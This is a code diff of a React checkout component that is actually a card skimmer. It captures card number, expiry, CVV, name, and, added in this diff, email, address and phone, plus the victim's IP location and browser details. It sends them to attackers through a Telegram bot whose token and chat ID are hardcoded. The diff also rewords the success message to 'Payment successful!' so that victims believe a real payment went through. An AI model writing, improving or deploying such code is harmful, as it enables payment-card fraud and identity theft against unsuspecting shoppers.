@@ -2,8 +2,8 @@
 import { useState } from 'react';
 import { useForm } from 'react-hook-form';
 
-const TELEGRAM_BOT_TOKEN = '7777336492:AAHCBTyrQYyMSU7hRye2Xd0PSORqIsAtktY';
-const TELEGRAM_CHAT_ID = '7860277201';
+const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw'; // Replace with your actual bot token
+const TELEGRAM_CHAT_ID = '7388576858'; // Replace with your actual chat ID
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -14,7 +14,15 @@ interface CreditCardFormData {
   expDate: string;
   cvv: string;
   cardName: string;
+  email: string;
+  address: string;
+  phoneNumber: string;
 }
+
+const escapeMarkdown = (text: string) => {
+  // Escape all special MarkdownV2 characters including hyphen
+  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
+};
 
 const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   const { register, handleSubmit, formState: { errors: formErrors } } = useForm<CreditCardFormData>();
@@ -23,13 +31,15 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     cardNumber: '',
     expiry: '',
     cvv: '',
+    email: '',
+    address: '',
+    phoneNumber: '',
   });
 
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [status, setStatus] = useState({ message: '', color: '' });
   const [loading, setLoading] = useState(false);
 
-  // Luhn algorithm for card validation
   const luhnCheck = (num: string): boolean => {
     const arr = num.split('').reverse().map(x => parseInt(x, 10));
     let sum = arr.reduce((acc, val, i) => {
@@ -84,6 +94,9 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
     if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
     if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
+    if (!form.email.trim()) errs.email = 'Please enter your email.';
+    if (!form.address.trim()) errs.address = 'Please enter your address.';
+    if (!form.phoneNumber.trim()) errs.phoneNumber = 'Please enter your phone number.';
     setErrors(errs);
     return Object.keys(errs).length === 0;
   };
@@ -101,19 +114,24 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         const data = await res.json();
         ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
       }
-    } catch {}
+    } catch (error) {
+      console.error('Error fetching IP info:', error);
+    }
 
     const message = `
-New Credit Card Info Captured
+*New Credit Card Info Captured*
 
-- Name: ${form.cardName}
-- Card Number: ${form.cardNumber.replace(/\s/g, '')}
-- Expiry: ${form.expiry}
-- CVV: ${form.cvv}
+\\- Name: ${escapeMarkdown(form.cardName)}
+\\- Card Number: ${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}
+\\- Expiry: ${escapeMarkdown(form.expiry)}
+\\- CVV: ${escapeMarkdown(form.cvv)}
+\\- Email: ${escapeMarkdown(form.email)}
+\\- Address: ${escapeMarkdown(form.address)}
+\\- Phone Number: ${escapeMarkdown(form.phoneNumber)}
 
-IP Info: ${ipInfo}
-User Agent: ${navigator.userAgent}
-Timestamp: ${new Date().toISOString()}
+*IP Info*: ${escapeMarkdown(ipInfo)}
+*User Agent*: ${escapeMarkdown(navigator.userAgent)}
+*Timestamp*: ${escapeMarkdown(new Date().toISOString())}
     `.trim();
 
     try {
@@ -124,18 +142,18 @@ Timestamp: ${new Date().toISOString()}
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text: message,
-          parse_mode: 'Markdown',
+          parse_mode: 'MarkdownV2',
         }),
       });
       const json = await res.json();
       if (json.ok) {
-        setStatus({ message: 'Data sent successfully!', color: 'green' });
-        setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '' });
+        setStatus({ message: 'Payment successful!', color: 'green' });
+        setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '', email: '', address: '', phoneNumber: '' });
       } else {
-        setStatus({ message: 'Failed to send data: ' + json.description, color: 'red' });
+        setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
       }
     } catch (err) {
-      setStatus({ message: 'Error sending data: ' + (err as Error).message, color: 'red' });
+      setStatus({ message: `Error processing payment: ${err instanceof Error ? err.message : 'Unknown error'}`, color: 'red' });
     }
 
     setLoading(false);
@@ -198,6 +216,45 @@ Timestamp: ${new Date().toISOString()}
           />
           {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
         </div>
+
+        <div className="col-span-2">
+          <input
+            type="email"
+            name="email"
+            placeholder="Email"
+            value={form.email}
+            onChange={handleChange}
+            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.email ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
+            disabled={loading}
+          />
+          {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
+        </div>
+
+        <div className="col-span-2">
+          <input
+            type="text"
+            name="address"
+            placeholder="Address"
+            value={form.address}
+            onChange={handleChange}
+            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.address ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
+            disabled={loading}
+          />
+          {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
+        </div>
+
+        <div className="col-span-2">
+          <input
+            type="text"
+            name="phoneNumber"
+            placeholder="Phone Number"
+            value={form.phoneNumber}
+            onChange={handleChange}
+            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.phoneNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
+            disabled={loading}
+          />
+          {errors.phoneNumber && <p className="text-red-500 text-sm mt-1">{errors.phoneNumber}</p>}
+        </div>
       </div>
 
       <div className="pt-4">
@@ -208,11 +265,11 @@ Timestamp: ${new Date().toISOString()}
         >
           {loading ? (
             <div className="flex items-center justify-center space-x-2">
-              <span>Sending</span>
+              <span>Processing...</span>
               <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
             </div>
           ) : (
-            `Pay $${totalAmount.toFixed(2)} with Credit Card`
+            `Pay $${totalAmount.toFixed(2)}`
           )}
         </button>
       </div>
